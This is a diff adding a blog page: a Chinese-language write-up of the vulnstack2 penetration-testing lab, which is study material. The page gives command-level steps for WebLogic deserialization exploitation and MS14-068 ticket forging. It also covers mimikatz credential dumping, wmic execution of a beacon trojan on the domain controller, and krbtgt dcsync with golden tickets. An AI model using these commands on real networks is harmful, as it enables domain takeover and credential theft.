@@ -1,0 +1,384 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>vulnstack2 | 1jzz</title>
+<link rel="shortcut icon" href="https://1jzz.github.io/favicon.ico?v=1659229140591">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://1jzz.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="vulnstack2 | 1jzz - Atom Feed" href="https://1jzz.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="环境
+DC
+IP：10.10.10.10   OS：Windows 2012(64)
+应用：AD域
+WEB
+IP1：10.10.10.80
+IP2：192.168.111.80   OS：Windows 2008(64)
+应用：Weblog..." />
+    <meta name="keywords" content="内网" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://1jzz.github.io">
+  <img class="avatar" src="https://1jzz.github.io/images/avatar.png?v=1659229140591" alt="">
+  </a>
+  <h1 class="site-title">
+    1jzz
+  </h1>
+  <p class="site-description">
+    当人生跌入谷底，剩下的每一步都是向上。
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              vulnstack2
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-04-30
+              </span>
+              <span>
+                7 min read
+              </span>
+              
+                <a href="https://1jzz.github.io/tag/qrjUTseS5/" class="post-tag">
+                  # 内网
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h1 id="环境">环境</h1>
+<p>DC<br>
+IP：10.10.10.10   OS：Windows 2012(64)<br>
+应用：AD域<br>
+WEB<br>
+IP1：10.10.10.80<br>
+IP2：192.168.111.80   OS：Windows 2008(64)<br>
+应用：Weblogic 10.3.6 MSSQL 2008<br>
+PC<br>
+IP1：10.10.10.201<br>
+IP2：192.168.111.201   OS：Windows 7(32)<br>
+应用：<br>
+攻击机<br>
+IP：192.168.111.128：Kali</p>
+<h1 id="信息收集">信息收集</h1>
+<h2 id="主机发现">主机发现</h2>
+<p><code>nmap -Pn 192.168.111.0/24</code><br>
+结果：</p>
+<ul>
+<li>192.168.111.201</li>
+<li>192.168.111.80</li>
+</ul>
+<h2 id="详细服务扫描">详细服务扫描</h2>
+<p><code>nmap -A -p- -T4 192.168.111.201</code></p>
+<ul>
+<li>windows 7操作系统</li>
+<li>开启了445共享文件夹端口，可能存在ms17-010漏洞</li>
+<li>开启了3389RDP服务，可以进行爆破</li>
+</ul>
+<p><code>nmap -A -p- -T4 192.168.111.80</code></p>
+<ul>
+<li>windows 2008 R2</li>
+<li>80端口web服务，IIS7.5(如果配置了CGI，可能存在文件解析漏洞)</li>
+<li>1433端口，mssql 2008</li>
+<li>3389 RDP，445 CIFS</li>
+<li>7001端口，WebLogic(10.3.6.0)</li>
+</ul>
+<h2 id="目录扫描">目录扫描</h2>
+<ul>
+<li>只扫出了一个目录，而且还没有返回内容</li>
+</ul>
+<h1 id="getshell">getshell</h1>
+<ul>
+<li>windows7或者windows 2008都有可能存在ms17-010漏洞，可以直接getshell</li>
+<li>weblogic漏洞利用getshell(这里就不对代码进行研究了，直接上工具)</li>
+</ul>
+<p><code>python3 WeblogicScan.py -u 192.168.111.80 -p 7001</code><br>
+存在反序列化CVE漏洞：CVE-2019-2725</p>
+<ol>
+<li>使用msf进行利用</li>
+</ol>
+<p><code>multi/misc/weblogic_deserialize_asyncresponseservice</code>：CVE-2019-2725，默认为Unix，需要改payload和target</p>
+<ol start="2">
+<li>使用powershell上线CS(Scripted Web Delivery)</li>
+</ol>
+<h1 id="提权">提权</h1>
+<h2 id="本地提权">本地提权</h2>
+<ol>
+<li>systeminfo查看补丁情况，进行提权，该服务器是win 2008 R2，如果没有打补丁可以使用ms14-058提权</li>
+<li>是否在当前机器的管理员组中，使用UAC Bypass提权
+<ul>
+<li>本机的de1ay用户在管理员组中，可以进行UAC Bypass提权</li>
+</ul>
+</li>
+</ol>
+<h2 id="域内提权">域内提权</h2>
+<p>因为我们获得了mssql账户和de1ay账户的明文密码，若是域控主机没有打对应的补丁的话可以使用MS14-068伪造TGT中的权限从而获取域管理员权限.<br>
+使用pykek进行伪造TGT：<br>
+Usage：<br>
+<code>ms14-068.py -u &lt;userName&gt;@&lt;domainName&gt; -s &lt;userSid&gt; -d &lt;domainControlerAddr&gt;</code></p>
+<ol>
+<li>还需要获取mssql或者de1ay账户的sid
+<ol>
+<li>通过powerview来获取sid</li>
+<li><code>powershell_import /root/ps1/PowerView.ps1</code></li>
+<li><code>powershell_shell</code></li>
+<li><code>Get-NetUser</code></li>
+</ol>
+</li>
+<li>使用pykek伪造TGT票据：<code>proxychains4 python ms14-068.py -u de1ay@de1ay.com -p &quot;1qaz@WSX&quot; -s S-1-5-21-2756371121-2868759905-3853650604-1001 -d 10.10.10.10</code></li>
+<li>使用CS清除凭证，上传并且注入TGT票据
+<ol>
+<li><code>mimikatz kerberos::purge</code></li>
+<li><code>mimikatz kerberos::list</code></li>
+<li><code>mimikatz kerberos::ptc TGT_de1ay@de1ay.com.ticket</code></li>
+</ol>
+</li>
+<li>验证权限，并且使用wmi连接
+<ol>
+<li><code>dir \\10.10.10.10\c$</code></li>
+</ol>
+</li>
+</ol>
+<h1 id="内网渗透">内网渗透</h1>
+<h2 id="信息收集-2">信息收集</h2>
+<ol>
+<li>尝试运行mimikatz获取明文密码(logonpasswords)
+<ul>
+<li>获取到服务账户mssql、域账户de1ay账号的明文密码</li>
+</ul>
+</li>
+<li>使用portscan进行内网机器探测(<code>portscan 10.10.10.0/24</code>，但是由于其是icmp进行主机探测，可能icmp协议被防火墙阻拦，所以信息可能不准确)</li>
+<li>使用net view获取域内机器列表(这里出现了6118错误，为Browser(Computer Browser)服务未开启或者被禁用)，开启此服务后其依赖的服务也要开启(server、workstation)，如果所有域内主机都关闭了该服务的话只能获取域控的ip
+<ol>
+<li><code>sc config &quot;Browser&quot; start= demand</code>  (或者auto)，启用该服务</li>
+<li><code>net start &quot;Browser&quot;</code>，开启该服务</li>
+</ol>
+</li>
+<li>meterpreter获取arp缓存信息，因为域内机器的DNS为域控，所以可能可以获取域控以及部分机器的ip地址</li>
+<li>msf中导入invoke-arpScan powershell脚本进行arp探测
+<ol>
+<li><code>load powershell</code></li>
+<li><code>powershell_import /root/ps1/Invoke-ARPScan.ps1</code></li>
+<li><code>powershell_shell</code></li>
+<li><code>Invoke-ARPScan -CIDR 10.10.10.0/24</code></li>
+</ol>
+</li>
+<li>获取域用户信息以及域内机器信息
+<ul>
+<li><code>net user &quot;domain admins&quot; /domain</code></li>
+<li><code>net user /domain</code></li>
+<li><code>net group &quot;domain computers&quot; /domain</code></li>
+</ul>
+</li>
+</ol>
+<p>结果：</p>
+<ul>
+<li>域名：de1ay.com</li>
+<li>存活主机：WEB(10.10.10.80)、PC(10.10.10.201)、DC(10.10.10.10)</li>
+<li>域管理员为：de1ay/Administrator</li>
+</ul>
+<h3 id="内网隧道建立">内网隧道建立</h3>
+<p>这里直接使用msf中的路由来设置内网代理(也可以使用其他协议的代理来使用)。</p>
+<ol>
+<li><code>route add 10.10.10.0 255.255.255.0 4</code></li>
+<li>开启socks代理，<code>auxiliary/server/socks_proxy</code>模块</li>
+<li>配置proxychains4(/etc/proxychains4.conf)</li>
+<li>使用<code>auxiliary/scanner/portscan/tcp</code>模块进行扫描端口信息</li>
+<li>使用<code>setspn -T de1ay -Q */*</code>进行SPN发现</li>
+</ol>
+<h2 id="横向移动">横向移动</h2>
+<p>由于域控处于内网中并且不出网，所以我们需要在跳板机WEB上进行监听。</p>
+<ol>
+<li>Pivoting-&gt;Listener</li>
+<li>生成exe木马</li>
+<li><code>upload /root/exe/beacontest.exe</code></li>
+<li><code>shell copy beacontest.exe \\10.10.10.10\c$</code></li>
+<li>使用wmic执行该exe木马：<code>shell wmic /node:10.10.10.10 /user:de1ay /password:1qaz@WSX process call create &quot;cmd.exe /c start c:\beacontest.exe&quot;</code></li>
+</ol>
+<p>还有一台PC机子10.10.10.201，现在我们已经获取到了域管理员的NTLM哈希，直接进行哈希传递就可以获取到PC主机的权限，直接使用psExec即可。</p>
+<h1 id="权限维持">权限维持</h1>
+<p>因为域控的操作系统为win2012，打了KB2871997补丁，如果想要获取明文密码的话就需要修改注册表(还可以通过对比hash值来获取密码，Administrator账户的hash和我们已经获取到明文密码的账户mssql、de1ay的hash值一致，所以可以知道该明文密码，也能通过NTLM Hash爆破来获取密码)。<br>
+<code>reg add hklm\system\currentcontrolset\control\securityproviders\wdigest /v UseLogonCredential /t REG_DWORD /d 1</code><br>
+但是需要注销或者重启才能抓到。<br>
+获取krbtgt账户的NTLM Hash：<br>
+<code>mimikatz lsadump::dcsync /domain:de1ay.com /dc:DC /user:krbtgt</code><br>
+有了krbtgt用户的NTLM Hash，就可以通过黄金票据来伪造任何用户。<br>
+也可以使用mssql的NTLM Hash或者其他服务的NTLM Hash来制作白银票据，但是这些账户的密码修改之后将不会生效。</p>
+<h1 id="总结">总结</h1>
+<p>这个vulstack2靶场中遇到了一些问题：</p>
+<ul>
+<li>mssql账户无法进行ms14-068提权，也有可能是我注入的有问题</li>
+<li>WEB/de1ay用户的密码无法使用1qaz@WSX登录，抓取了hash发现其hash与mssql账户的hash并不相同</li>
+<li>不会免杀。。。。。。</li>
+</ul>
+<p>解决：</p>
+<ul>
+<li>通过跳板机上线不出网机器</li>
+<li>一些信息收集的方法</li>
+</ul>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E7%8E%AF%E5%A2%83">环境</a></li>
+<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a>
+<ul>
+<li><a href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0">主机发现</a></li>
+<li><a href="#%E8%AF%A6%E7%BB%86%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F">详细服务扫描</a></li>
+<li><a href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F">目录扫描</a></li>
+</ul>
+</li>
+<li><a href="#getshell">getshell</a></li>
+<li><a href="#%E6%8F%90%E6%9D%83">提权</a>
+<ul>
+<li><a href="#%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83">本地提权</a></li>
+<li><a href="#%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83">域内提权</a></li>
+</ul>
+</li>
+<li><a href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F">内网渗透</a>
+<ul>
+<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-2">信息收集</a>
+<ul>
+<li><a href="#%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E5%BB%BA%E7%AB%8B">内网隧道建立</a></li>
+</ul>
+</li>
+<li><a href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8">横向移动</a></li>
+</ul>
+</li>
+<li><a href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81">权限维持</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://1jzz.github.io/post/2GNdJxHP9/">
+              <h3 class="post-title">
+                vulnstack1
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  友链： <a href="https://www.cnblogs.com/sherlson/" target="_blank">sherlson</a>、<a href="https://cyberczy.github.io/" target="_blank">cyberczy</a>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?d4b50d1451bf48cde435f45724be67b3";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+  <a class="rss" href="https://1jzz.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
